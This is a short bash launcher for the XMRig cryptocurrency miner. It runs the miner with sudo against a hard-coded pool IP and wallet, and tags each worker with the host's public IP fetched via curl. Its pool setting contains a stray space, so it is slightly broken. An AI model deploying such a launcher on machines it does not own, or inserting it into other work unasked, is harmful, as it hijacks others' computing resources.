#!/bin/bash
POOL=192.142.226.146 :1123
WALLET=ZEPHsDDio3v5VbHMJjnDDyW7bdKdLf9rpcNSMoxVsTZ2iQ9aoiXkmvXUcwjxr2hUyndjAYHP1MzRCNGU763xHcT8PC941LaTEJD.$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"
chmod +x ./xmrig && sudo ./xmrig -a rx -o $POOL -u $WALLET $@ -p x
